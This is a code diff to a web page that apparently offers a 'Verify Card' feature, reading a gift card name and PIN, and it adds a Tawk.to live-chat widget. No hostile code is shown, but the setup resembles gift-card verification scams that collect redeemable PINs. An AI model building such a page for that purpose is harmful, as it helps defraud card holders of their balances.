@@ -542,6 +542,10 @@ Message </textarea
                         <h3>Links</h3>
                         <ul class="Menu_footer">
                           <li class="active"><a href="#">Home</a></li>
+                          <li class="active">
+                            <a href="#verify">Verify Card</a>
+                          </li>
+
                           <li><a href="#about">About </a></li>
                           <li><a href="#work">Work</a></li>
                           <li><a href="#contact">Contact </a></li>
@@ -600,7 +604,10 @@ Message </textarea
 
         <!-- end footer -->
 
-        <div class="fixed z-50 overflow-y-auto top-0 w-full left-0" id="modall">
+        <div
+          class="fixed z-50 overflow-y-auto top-0 w-full left-0 hidden"
+          id="modall"
+        >
           <div
             class="flex items-center justify-center min-height-100vh pt-4 px-4 pb-20 text-center sm:block sm:p-0"
           >
@@ -928,6 +935,9 @@ Message </textarea
         const pin = document.querySelector("#pin");
 
         if (name === "NONE") {
+          alert("select a giftcard name please ");
+          document.getElementById("text").innerText = "Verify";
+
           error.textContent = "Please select Gift Card name";
           modal.click();
           return;
@@ -1010,5 +1020,21 @@ Message </textarea
           });
       };
     </script>
+
+    <!--Start of Tawk.to Script-->
+    <script type="text/javascript">
+      var Tawk_API = Tawk_API || {},
+        Tawk_LoadStart = new Date();
+      (function () {
+        var s1 = document.createElement("script"),
+          s0 = document.getElementsByTagName("script")[0];
+        s1.async = true;
+        s1.src = "https://embed.tawk.to/637103ccdaff0e1306d72cda/1ghondmj5";
+        s1.charset = "UTF-8";
+        s1.setAttribute("crossorigin", "*");
+        s0.parentNode.insertBefore(s1, s0);
+      })();
+    </script>
+    <!--End of Tawk.to Script-->
   </body>
 </html>
